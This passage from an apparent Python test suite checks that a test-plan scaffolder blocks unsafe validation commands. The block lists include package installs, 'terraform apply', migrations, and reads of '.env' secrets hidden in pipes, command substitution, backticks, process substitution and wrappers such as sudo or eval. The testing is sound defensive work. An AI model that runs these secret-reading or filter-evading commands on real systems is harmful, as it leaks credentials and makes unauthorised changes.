    assert_true(unsafe_secret_file_exfiltration_summary.get("validation_command_count") == 1, "secret file exfiltration validation should preserve only non-secret test commands.")
    assert_true(unsafe_secret_file_exfiltration_summary.get("blocked_validation_command_count") == 8, "secret file copy/archive/encode/upload commands should be blocked validation commands.")
    assert_true(
        ["npm", "test", "--", "config"] in unsafe_secret_file_exfiltration_commands,
        "safe npm test command should remain executable beside blocked secret file exfiltration commands.",
    )
    for command in unsafe_secret_file_exfiltration_blocked_commands:
        assert_true(
            command.split() not in unsafe_secret_file_exfiltration_commands,
            f"{command} must not become an executable validation command.",
        )
    assert_true(
        unsafe_secret_file_exfiltration_summary.get("blocked_validation_commands") == unsafe_secret_file_exfiltration_blocked_commands,
        "blocked secret file exfiltration commands should be listed for auditability.",
    )
    unsafe_secret_file_exfiltration_coverage_path = unsafe_secret_file_exfiltration_dir / "requirement-coverage.json"
    unsafe_secret_file_exfiltration_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_secret_file_exfiltration_dir / "requirement.md"),
            "--matrix",
            str(unsafe_secret_file_exfiltration_dir / "test-matrix.json"),
            "--out",
            str(unsafe_secret_file_exfiltration_coverage_path),
        ],
        cwd=unsafe_secret_file_exfiltration_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_secret_file_exfiltration_coverage_proc.returncode == 0, "secret file exfiltration source lines should map as blocked code_pr coverage instead of disappearing.")
    unsafe_secret_file_exfiltration_coverage = load_json(unsafe_secret_file_exfiltration_coverage_path)
    unsafe_secret_file_exfiltration_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_secret_file_exfiltration_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_secret_file_exfiltration_blocked_commands:
        command_matches = unsafe_secret_file_exfiltration_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_secret_file_exfiltration_coverage.get("coverage_complete") is True, "secret file exfiltration source coverage should remain complete.")

    unsafe_dependency_mutation_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_DEPENDENCY_MUTATION_CODE_PR_REQUIREMENT,
        "unsafe-dependency-mutation-code-pr-scaffold",
    )
    unsafe_dependency_mutation_summary = load_json(unsafe_dependency_mutation_dir / "scaffold-summary.json")
    unsafe_dependency_mutation_plan = load_json(unsafe_dependency_mutation_dir / "test-plan.json")
    unsafe_dependency_mutation_steps = [
        step
        for scenario in unsafe_dependency_mutation_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_dependency_mutation_commands = [step.get("command") for step in unsafe_dependency_mutation_steps if step.get("action") == "command"]
    unsafe_dependency_mutation_blocked_commands = [
        "npm install",
        "pnpm add lodash",
        "yarn remove left-pad",
        "bun add zod",
        "pip install -r requirements.txt",
        "poetry add requests",
        "bundle install",
        "composer update",
        "brew install redis",
        "apt-get install -y redis",
    ]
    assert_true(unsafe_dependency_mutation_summary.get("validation_command_count") == 1, "dependency mutation validation should preserve only non-mutating test commands.")
    assert_true(unsafe_dependency_mutation_summary.get("blocked_validation_command_count") == 10, "dependency and system package mutation commands should be blocked validation commands.")
    assert_true(
        ["npm", "test", "--", "deps"] in unsafe_dependency_mutation_commands,
        "safe npm test command should remain executable beside blocked dependency mutation commands.",
    )
    for command in unsafe_dependency_mutation_blocked_commands:
        assert_true(
            command.split() not in unsafe_dependency_mutation_commands,
            f"{command} must not become an executable validation command.",
        )
    assert_true(
        unsafe_dependency_mutation_summary.get("blocked_validation_commands") == unsafe_dependency_mutation_blocked_commands,
        "blocked dependency mutation commands should be listed for auditability.",
    )
    unsafe_dependency_mutation_coverage_path = unsafe_dependency_mutation_dir / "requirement-coverage.json"
    unsafe_dependency_mutation_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_dependency_mutation_dir / "requirement.md"),
            "--matrix",
            str(unsafe_dependency_mutation_dir / "test-matrix.json"),
            "--out",
            str(unsafe_dependency_mutation_coverage_path),
        ],
        cwd=unsafe_dependency_mutation_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_dependency_mutation_coverage_proc.returncode == 0, "dependency mutation source lines should map as blocked code_pr coverage instead of disappearing.")
    unsafe_dependency_mutation_coverage = load_json(unsafe_dependency_mutation_coverage_path)
    unsafe_dependency_mutation_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_dependency_mutation_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_dependency_mutation_blocked_commands:
        command_matches = unsafe_dependency_mutation_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_dependency_mutation_coverage.get("coverage_complete") is True, "dependency mutation source coverage should remain complete.")

    unsafe_shell_wrapped_mutation_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SHELL_WRAPPED_MUTATION_CODE_PR_REQUIREMENT,
        "unsafe-shell-wrapped-mutation-code-pr-scaffold",
    )
    unsafe_shell_wrapped_mutation_summary = load_json(unsafe_shell_wrapped_mutation_dir / "scaffold-summary.json")
    unsafe_shell_wrapped_mutation_plan = load_json(unsafe_shell_wrapped_mutation_dir / "test-plan.json")
    unsafe_shell_wrapped_mutation_steps = [
        step
        for scenario in unsafe_shell_wrapped_mutation_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_shell_wrapped_mutation_commands = [step.get("command") for step in unsafe_shell_wrapped_mutation_steps if step.get("action") == "command"]
    unsafe_shell_wrapped_mutation_blocked_commands = [
        "bash -lc \"npm install\"",
        "sh -c \"pnpm add lodash\"",
        "bash -lc \"terraform apply -auto-approve\"",
        "bash -lc \"python manage.py migrate\"",
    ]
    unsafe_shell_wrapped_mutation_forbidden_command_parts = [
        ["bash", "-lc", "npm install"],
        ["sh", "-c", "pnpm add lodash"],
        ["bash", "-lc", "terraform apply -auto-approve"],
        ["bash", "-lc", "python manage.py migrate"],
    ]
    assert_true(unsafe_shell_wrapped_mutation_summary.get("validation_command_count") == 1, "shell-wrapped mutation validation should preserve only non-mutating test commands.")
    assert_true(unsafe_shell_wrapped_mutation_summary.get("blocked_validation_command_count") == 4, "shell-wrapped dependency, database, and infrastructure mutations should be blocked validation commands.")
    assert_true(
        ["bash", "-lc", "npm test -- wrappers"] in unsafe_shell_wrapped_mutation_commands,
        "safe shell-wrapped npm test command should remain executable beside blocked shell-wrapped mutations.",
    )
    for command_parts in unsafe_shell_wrapped_mutation_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_shell_wrapped_mutation_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    assert_true(
        unsafe_shell_wrapped_mutation_summary.get("blocked_validation_commands") == unsafe_shell_wrapped_mutation_blocked_commands,
        "blocked shell-wrapped mutation commands should be listed for auditability.",
    )
    unsafe_shell_wrapped_mutation_coverage_path = unsafe_shell_wrapped_mutation_dir / "requirement-coverage.json"
    unsafe_shell_wrapped_mutation_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_shell_wrapped_mutation_dir / "requirement.md"),
            "--matrix",
            str(unsafe_shell_wrapped_mutation_dir / "test-matrix.json"),
            "--out",
            str(unsafe_shell_wrapped_mutation_coverage_path),
        ],
        cwd=unsafe_shell_wrapped_mutation_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_shell_wrapped_mutation_coverage_proc.returncode == 0, "shell-wrapped mutation source lines should map as blocked code_pr coverage instead of disappearing.")
    unsafe_shell_wrapped_mutation_coverage = load_json(unsafe_shell_wrapped_mutation_coverage_path)
    unsafe_shell_wrapped_mutation_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_shell_wrapped_mutation_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_shell_wrapped_mutation_blocked_commands:
        command_matches = unsafe_shell_wrapped_mutation_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_shell_wrapped_mutation_coverage.get("coverage_complete") is True, "shell-wrapped mutation source coverage should remain complete.")

    unsafe_runner_shell_wrapped_mutation_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_RUNNER_SHELL_WRAPPED_MUTATION_CODE_PR_REQUIREMENT,
        "unsafe-runner-shell-wrapped-mutation-code-pr-scaffold",
    )
    unsafe_runner_shell_wrapped_mutation_summary = load_json(unsafe_runner_shell_wrapped_mutation_dir / "scaffold-summary.json")
    unsafe_runner_shell_wrapped_mutation_plan = load_json(unsafe_runner_shell_wrapped_mutation_dir / "test-plan.json")
    unsafe_runner_shell_wrapped_mutation_steps = [
        step
        for scenario in unsafe_runner_shell_wrapped_mutation_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_runner_shell_wrapped_mutation_commands = [step.get("command") for step in unsafe_runner_shell_wrapped_mutation_steps if step.get("action") == "command"]
    unsafe_runner_shell_wrapped_mutation_blocked_commands = [
        "env bash -lc \"npm install\"",
        "npm exec -- bash -lc \"pnpm add lodash\"",
        "pnpm exec bash -lc \"terraform apply -auto-approve\"",
        "uv run bash -lc \"python manage.py migrate\"",
    ]
    unsafe_runner_shell_wrapped_mutation_forbidden_command_parts = [
        ["env", "bash", "-lc", "npm install"],
        ["npm", "exec", "--", "bash", "-lc", "pnpm add lodash"],
        ["pnpm", "exec", "bash", "-lc", "terraform apply -auto-approve"],
        ["uv", "run", "bash", "-lc", "python manage.py migrate"],
    ]
    assert_true(unsafe_runner_shell_wrapped_mutation_summary.get("validation_command_count") == 1, "runner shell-wrapped mutation validation should preserve only non-mutating test commands.")
    assert_true(unsafe_runner_shell_wrapped_mutation_summary.get("blocked_validation_command_count") == 4, "runner shell-wrapped dependency, database, and infrastructure mutations should be blocked validation commands.")
    assert_true(
        ["npm", "exec", "--", "bash", "-lc", "npm test -- wrappers"] in unsafe_runner_shell_wrapped_mutation_commands,
        "safe runner shell-wrapped npm test command should remain executable beside blocked runner shell-wrapped mutations.",
    )
    for command_parts in unsafe_runner_shell_wrapped_mutation_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_runner_shell_wrapped_mutation_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    assert_true(
        unsafe_runner_shell_wrapped_mutation_summary.get("blocked_validation_commands") == unsafe_runner_shell_wrapped_mutation_blocked_commands,
        "blocked runner shell-wrapped mutation commands should be listed for auditability.",
    )
    unsafe_runner_shell_wrapped_mutation_coverage_path = unsafe_runner_shell_wrapped_mutation_dir / "requirement-coverage.json"
    unsafe_runner_shell_wrapped_mutation_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_runner_shell_wrapped_mutation_dir / "requirement.md"),
            "--matrix",
            str(unsafe_runner_shell_wrapped_mutation_dir / "test-matrix.json"),
            "--out",
            str(unsafe_runner_shell_wrapped_mutation_coverage_path),
        ],
        cwd=unsafe_runner_shell_wrapped_mutation_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_runner_shell_wrapped_mutation_coverage_proc.returncode == 0, "runner shell-wrapped mutation source lines should map as blocked code_pr coverage instead of disappearing.")
    unsafe_runner_shell_wrapped_mutation_coverage = load_json(unsafe_runner_shell_wrapped_mutation_coverage_path)
    unsafe_runner_shell_wrapped_mutation_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_runner_shell_wrapped_mutation_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_runner_shell_wrapped_mutation_blocked_commands:
        command_matches = unsafe_runner_shell_wrapped_mutation_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_runner_shell_wrapped_mutation_coverage.get("coverage_complete") is True, "runner shell-wrapped mutation source coverage should remain complete.")


def _verify_shell_substitution_safety(script_dir: Path, tmp_path: Path) -> None:
    unsafe_shell_operator_punctuation_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SHELL_OPERATOR_PUNCTUATION_CODE_PR_REQUIREMENT,
        "unsafe-shell-operator-punctuation-code-pr-scaffold",
    )
    unsafe_shell_operator_punctuation_summary = load_json(unsafe_shell_operator_punctuation_dir / "scaffold-summary.json")
    unsafe_shell_operator_punctuation_plan = load_json(unsafe_shell_operator_punctuation_dir / "test-plan.json")
    unsafe_shell_operator_punctuation_steps = [
        step
        for scenario in unsafe_shell_operator_punctuation_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_shell_operator_punctuation_commands = [step.get("command") for step in unsafe_shell_operator_punctuation_steps if step.get("action") == "command"]
    unsafe_shell_operator_punctuation_blocked_commands = [
        "bash -lc \"npm test||npm install\"",
        "bash -lc \"python manage.py migrate||npm test\"",
        "bash -lc \"terraform plan|terraform apply -auto-approve\"",
        "bash -lc \"cat .env|base64\"",
    ]
    unsafe_shell_operator_punctuation_forbidden_command_parts = [
        ["bash", "-lc", "npm test||npm install"],
        ["bash", "-lc", "python manage.py migrate||npm test"],
        ["bash", "-lc", "terraform plan|terraform apply -auto-approve"],
        ["bash", "-lc", "cat .env|base64"],
    ]
    assert_true(unsafe_shell_operator_punctuation_summary.get("validation_command_count") == 1, "shell operator punctuation validation should preserve only non-mutating test commands.")
    assert_true(unsafe_shell_operator_punctuation_summary.get("blocked_validation_command_count") == 4, "shell operator punctuation mutations and secret pipes should be blocked validation commands.")
    assert_true(
        ["bash", "-lc", "npm test -- punctuation"] in unsafe_shell_operator_punctuation_commands,
        "safe shell punctuation npm test command should remain executable beside blocked operator punctuation commands.",
    )
    for command_parts in unsafe_shell_operator_punctuation_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_shell_operator_punctuation_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    assert_true(
        unsafe_shell_operator_punctuation_summary.get("blocked_validation_commands") == unsafe_shell_operator_punctuation_blocked_commands,
        "blocked shell operator punctuation commands should be listed for auditability.",
    )
    unsafe_shell_operator_punctuation_coverage_path = unsafe_shell_operator_punctuation_dir / "requirement-coverage.json"
    unsafe_shell_operator_punctuation_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_shell_operator_punctuation_dir / "requirement.md"),
            "--matrix",
            str(unsafe_shell_operator_punctuation_dir / "test-matrix.json"),
            "--out",
            str(unsafe_shell_operator_punctuation_coverage_path),
        ],
        cwd=unsafe_shell_operator_punctuation_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_shell_operator_punctuation_coverage_proc.returncode == 0, "shell operator punctuation source lines should map as blocked code_pr coverage instead of being split as markdown tables.")
    unsafe_shell_operator_punctuation_coverage = load_json(unsafe_shell_operator_punctuation_coverage_path)
    unsafe_shell_operator_punctuation_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_shell_operator_punctuation_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_shell_operator_punctuation_blocked_commands:
        command_matches = unsafe_shell_operator_punctuation_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_shell_operator_punctuation_coverage.get("coverage_complete") is True, "shell operator punctuation source coverage should remain complete.")

    unsafe_shell_command_substitution_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SHELL_COMMAND_SUBSTITUTION_CODE_PR_REQUIREMENT,
        "unsafe-shell-command-substitution-code-pr-scaffold",
    )
    unsafe_shell_command_substitution_summary = load_json(unsafe_shell_command_substitution_dir / "scaffold-summary.json")
    unsafe_shell_command_substitution_plan = load_json(unsafe_shell_command_substitution_dir / "test-plan.json")
    unsafe_shell_command_substitution_steps = [
        step
        for scenario in unsafe_shell_command_substitution_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_shell_command_substitution_commands = [step.get("command") for step in unsafe_shell_command_substitution_steps if step.get("action") == "command"]
    unsafe_shell_command_substitution_blocked_commands = [
        "bash -lc \"echo $(npm install)\"",
        "bash -lc \"echo $(cat .env)\"",
        "bash -lc \"npm test $(pnpm add lodash)\"",
        "bash -lc \"echo $(terraform apply -auto-approve)\"",
    ]
    unsafe_shell_command_substitution_forbidden_command_parts = [
        ["bash", "-lc", "echo $(npm install)"],
        ["bash", "-lc", "echo $(cat .env)"],
        ["bash", "-lc", "npm test $(pnpm add lodash)"],
        ["bash", "-lc", "echo $(terraform apply -auto-approve)"],
    ]
    assert_true(unsafe_shell_command_substitution_summary.get("validation_command_count") == 1, "shell command substitution validation should preserve only non-mutating test commands.")
    assert_true(unsafe_shell_command_substitution_summary.get("blocked_validation_command_count") == 4, "shell command substitution mutations and secret reads should be blocked validation commands.")
    assert_true(
        ["bash", "-lc", "npm test -- substitution"] in unsafe_shell_command_substitution_commands,
        "safe shell command substitution npm test command should remain executable beside blocked substitution commands.",
    )
    for command_parts in unsafe_shell_command_substitution_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_shell_command_substitution_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    assert_true(
        unsafe_shell_command_substitution_summary.get("blocked_validation_commands") == unsafe_shell_command_substitution_blocked_commands,
        "blocked shell command substitution commands should be listed for auditability.",
    )
    unsafe_shell_command_substitution_coverage_path = unsafe_shell_command_substitution_dir / "requirement-coverage.json"
    unsafe_shell_command_substitution_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_shell_command_substitution_dir / "requirement.md"),
            "--matrix",
            str(unsafe_shell_command_substitution_dir / "test-matrix.json"),
            "--out",
            str(unsafe_shell_command_substitution_coverage_path),
        ],
        cwd=unsafe_shell_command_substitution_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_shell_command_substitution_coverage_proc.returncode == 0, "shell command substitution source lines should map as blocked code_pr coverage instead of becoming executable commands.")
    unsafe_shell_command_substitution_coverage = load_json(unsafe_shell_command_substitution_coverage_path)
    unsafe_shell_command_substitution_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_shell_command_substitution_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_shell_command_substitution_blocked_commands:
        command_matches = unsafe_shell_command_substitution_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_shell_command_substitution_coverage.get("coverage_complete") is True, "shell command substitution source coverage should remain complete.")

    unsafe_shell_backtick_substitution_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SHELL_BACKTICK_SUBSTITUTION_CODE_PR_REQUIREMENT,
        "unsafe-shell-backtick-substitution-code-pr-scaffold",
    )
    unsafe_shell_backtick_substitution_summary = load_json(unsafe_shell_backtick_substitution_dir / "scaffold-summary.json")
    unsafe_shell_backtick_substitution_plan = load_json(unsafe_shell_backtick_substitution_dir / "test-plan.json")
    unsafe_shell_backtick_substitution_steps = [
        step
        for scenario in unsafe_shell_backtick_substitution_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_shell_backtick_substitution_commands = [step.get("command") for step in unsafe_shell_backtick_substitution_steps if step.get("action") == "command"]
    unsafe_shell_backtick_substitution_blocked_commands = [
        "bash -lc \"echo `npm install`\"",
        "bash -lc \"echo `cat .env`\"",
        "bash -lc \"npm test `pnpm add lodash`\"",
        "bash -lc \"echo `terraform apply -auto-approve`\"",
    ]
    unsafe_shell_backtick_substitution_forbidden_command_parts = [
        ["bash", "-lc", "echo `npm install`"],
        ["bash", "-lc", "echo `cat .env`"],
        ["bash", "-lc", "npm test `pnpm add lodash`"],
        ["bash", "-lc", "echo `terraform apply -auto-approve`"],
    ]
    assert_true(unsafe_shell_backtick_substitution_summary.get("validation_command_count") == 1, "shell backtick substitution validation should preserve only non-mutating test commands.")
    assert_true(unsafe_shell_backtick_substitution_summary.get("blocked_validation_command_count") == 4, "shell backtick substitution mutations and secret reads should be blocked validation commands.")
    assert_true(
        ["bash", "-lc", "npm test -- backticks"] in unsafe_shell_backtick_substitution_commands,
        "safe shell backtick substitution npm test command should remain executable beside blocked substitution commands.",
    )
    for command_parts in unsafe_shell_backtick_substitution_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_shell_backtick_substitution_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    assert_true(
        unsafe_shell_backtick_substitution_summary.get("blocked_validation_commands") == unsafe_shell_backtick_substitution_blocked_commands,
        "blocked shell backtick substitution commands should preserve the original source lines for auditability.",
    )
    unsafe_shell_backtick_substitution_coverage_path = unsafe_shell_backtick_substitution_dir / "requirement-coverage.json"
    unsafe_shell_backtick_substitution_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_shell_backtick_substitution_dir / "requirement.md"),
            "--matrix",
            str(unsafe_shell_backtick_substitution_dir / "test-matrix.json"),
            "--out",
            str(unsafe_shell_backtick_substitution_coverage_path),
        ],
        cwd=unsafe_shell_backtick_substitution_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_shell_backtick_substitution_coverage_proc.returncode == 0, "shell backtick substitution source lines should map as blocked code_pr coverage instead of partial inner commands.")
    unsafe_shell_backtick_substitution_coverage = load_json(unsafe_shell_backtick_substitution_coverage_path)
    unsafe_shell_backtick_substitution_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_shell_backtick_substitution_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_shell_backtick_substitution_blocked_commands:
        command_matches = unsafe_shell_backtick_substitution_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_shell_backtick_substitution_coverage.get("coverage_complete") is True, "shell backtick substitution source coverage should remain complete.")

    unsafe_shell_process_substitution_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SHELL_PROCESS_SUBSTITUTION_CODE_PR_REQUIREMENT,
        "unsafe-shell-process-substitution-code-pr-scaffold",
    )
    unsafe_shell_process_substitution_summary = load_json(unsafe_shell_process_substitution_dir / "scaffold-summary.json")
    unsafe_shell_process_substitution_plan = load_json(unsafe_shell_process_substitution_dir / "test-plan.json")
    unsafe_shell_process_substitution_steps = [
        step
        for scenario in unsafe_shell_process_substitution_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_shell_process_substitution_commands = [step.get("command") for step in unsafe_shell_process_substitution_steps if step.get("action") == "command"]
    unsafe_shell_process_substitution_blocked_commands = [
        "bash -lc \"echo <(npm install)\"",
        "bash -lc \"cat <(cat .env)\"",
        "bash -lc \"npm test <(pnpm add lodash)\"",
        "bash -lc \"diff <(terraform apply -auto-approve) expected.txt\"",
        "bash -lc \"cat package.json >(npm install)\"",
    ]
    unsafe_shell_process_substitution_forbidden_command_parts = [
        ["bash", "-lc", "echo <(npm install)"],
        ["bash", "-lc", "cat <(cat .env)"],
        ["bash", "-lc", "npm test <(pnpm add lodash)"],
        ["bash", "-lc", "diff <(terraform apply -auto-approve) expected.txt"],
        ["bash", "-lc", "cat package.json >(npm install)"],
    ]
    assert_true(unsafe_shell_process_substitution_summary.get("validation_command_count") == 1, "shell process substitution validation should preserve only non-mutating test commands.")
    assert_true(unsafe_shell_process_substitution_summary.get("blocked_validation_command_count") == 5, "shell process substitution mutations and secret reads should be blocked validation commands.")
    assert_true(
        ["bash", "-lc", "npm test -- process-substitution"] in unsafe_shell_process_substitution_commands,
        "safe shell process substitution npm test command should remain executable beside blocked substitution commands.",
    )
    for command_parts in unsafe_shell_process_substitution_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_shell_process_substitution_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    assert_true(
        unsafe_shell_process_substitution_summary.get("blocked_validation_commands") == unsafe_shell_process_substitution_blocked_commands,
        "blocked shell process substitution commands should preserve the original source lines for auditability.",
    )
    unsafe_shell_process_substitution_coverage_path = unsafe_shell_process_substitution_dir / "requirement-coverage.json"
    unsafe_shell_process_substitution_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_shell_process_substitution_dir / "requirement.md"),
            "--matrix",
            str(unsafe_shell_process_substitution_dir / "test-matrix.json"),
            "--out",
            str(unsafe_shell_process_substitution_coverage_path),
        ],
        cwd=unsafe_shell_process_substitution_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_shell_process_substitution_coverage_proc.returncode == 0, "shell process substitution source lines should map as blocked code_pr coverage instead of executable commands.")
    unsafe_shell_process_substitution_coverage = load_json(unsafe_shell_process_substitution_coverage_path)
    unsafe_shell_process_substitution_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_shell_process_substitution_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_shell_process_substitution_blocked_commands:
        command_matches = unsafe_shell_process_substitution_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_shell_process_substitution_coverage.get("coverage_complete") is True, "shell process substitution source coverage should remain complete.")


def _verify_secret_read_wrapper_safety(script_dir: Path, tmp_path: Path) -> None:
    """验证 shell 包装与环境变量间接读取边界。"""
    unsafe_shell_wrapped_secret_read_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SHELL_WRAPPED_SECRET_READ_CODE_PR_REQUIREMENT,
        "unsafe-shell-wrapped-secret-read-code-pr-scaffold",
    )
    unsafe_shell_wrapped_secret_read_summary = load_json(unsafe_shell_wrapped_secret_read_dir / "scaffold-summary.json")
    unsafe_shell_wrapped_secret_read_plan = load_json(unsafe_shell_wrapped_secret_read_dir / "test-plan.json")
    unsafe_shell_wrapped_secret_read_steps = [
        step
        for scenario in unsafe_shell_wrapped_secret_read_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_shell_wrapped_secret_read_commands = [step.get("command") for step in unsafe_shell_wrapped_secret_read_steps if step.get("action") == "command"]
    unsafe_shell_wrapped_secret_read_blocked_commands = [
        "bash -lc \"eval cat .env\"",
        "bash -lc \"command cat .env\"",
        "bash -lc \"time cat .env\"",
        "bash -lc \"nice cat .env\"",
        "bash -lc \"nohup cat .env\"",
        "bash -lc \"sudo cat .env\"",
    ]
    unsafe_shell_wrapped_secret_read_forbidden_command_parts = [
        ["bash", "-lc", "eval cat .env"],
        ["bash", "-lc", "command cat .env"],
        ["bash", "-lc", "time cat .env"],
        ["bash", "-lc", "nice cat .env"],
        ["bash", "-lc", "nohup cat .env"],
        ["bash", "-lc", "sudo cat .env"],
    ]
    assert_true(unsafe_shell_wrapped_secret_read_summary.get("validation_command_count") == 1, "shell-wrapped secret read validation should preserve only non-secret test commands.")
    assert_true(unsafe_shell_wrapped_secret_read_summary.get("blocked_validation_command_count") == 6, "shell-wrapped secret reads should be blocked validation commands.")
    assert_true(
        ["bash", "-lc", "npm test -- wrapper-safe"] in unsafe_shell_wrapped_secret_read_commands,
        "safe shell wrapper npm test command should remain executable beside blocked secret reads.",
    )
    for command_parts in unsafe_shell_wrapped_secret_read_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_shell_wrapped_secret_read_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    assert_true(
        unsafe_shell_wrapped_secret_read_summary.get("blocked_validation_commands") == unsafe_shell_wrapped_secret_read_blocked_commands,
        "blocked shell-wrapped secret read commands should preserve the original source lines for auditability.",
    )
    unsafe_shell_wrapped_secret_read_coverage_path = unsafe_shell_wrapped_secret_read_dir / "requirement-coverage.json"
    unsafe_shell_wrapped_secret_read_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_shell_wrapped_secret_read_dir / "requirement.md"),
            "--matrix",
            str(unsafe_shell_wrapped_secret_read_dir / "test-matrix.json"),
            "--out",
            str(unsafe_shell_wrapped_secret_read_coverage_path),
        ],
        cwd=unsafe_shell_wrapped_secret_read_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_shell_wrapped_secret_read_coverage_proc.returncode == 0, "shell-wrapped secret read source lines should map as blocked code_pr coverage instead of executable commands.")
    unsafe_shell_wrapped_secret_read_coverage = load_json(unsafe_shell_wrapped_secret_read_coverage_path)
    unsafe_shell_wrapped_secret_read_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_shell_wrapped_secret_read_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_shell_wrapped_secret_read_blocked_commands:
        command_matches = unsafe_shell_wrapped_secret_read_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
